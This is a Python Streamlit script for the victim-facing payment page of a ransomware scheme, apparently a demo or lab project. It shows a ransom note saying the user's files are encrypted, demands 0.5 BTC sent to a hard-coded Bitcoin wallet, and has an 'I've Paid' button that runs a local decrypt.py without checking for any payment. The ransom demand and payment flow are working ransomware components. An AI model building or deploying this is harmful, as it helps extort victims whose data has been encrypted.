import streamlit as st
import subprocess
import platform
import os
import time

st.markdown("""
<style>
    .payment-box {
        background-color: #1a1f1a;
        border: 1px solid #80ff80;
        border-radius: 10px;
        padding: 5px;
        margin-top: 10px;
        color: white;
    }
    .payment-box h3 {
        margin-top: 2px;
        padding: 5px;
        color: #80ff80;
        border-radius: 5px;

    }
</style>
""", unsafe_allow_html=True)

st.title(" Payment Portal")

st.markdown("""
## Your Files Are Encrypted!

To recover your data, send **0.5 BTC** to the following wallet:

`bc1qar0srrr7xfkvy5l643lydnw9re59gtzzwf5mdq`  

After payment, click I've paid to unlock your files.
""")

st.markdown("""
<div class="payment-box">
    <h3>Payment Confirmation</h3>
""", unsafe_allow_html=True)
st.markdown("---")

if st.button("I've Paid! Decrypt My Files", use_container_width=True):
    try:
        if platform.system() == "Windows":
            subprocess.Popen(["python", "decrypt.py", "testing/open.txt"])

        else:
            subprocess.Popen(["python3", "decrypt.py"])

        st.success("Decrypting files...")
        time.sleep(2)

        if os.path.exists("testing\open.txt"):
            with open("testing\open.txt", "r", encoding="utf-8") as f:
                file_content = f.read()
                st.markdown("### 🔓 Decrypted File Content:")
                st.code(file_content, language="text")
        else:
            st.warning("File not found or decryption not complete yet.")

        st.toast("Your files are being decrypted...")

    except Exception as e:
        st.error(f"Decryption failed: {str(e)}")

st.markdown("</div>", unsafe_allow_html=True)

st.markdown("---")
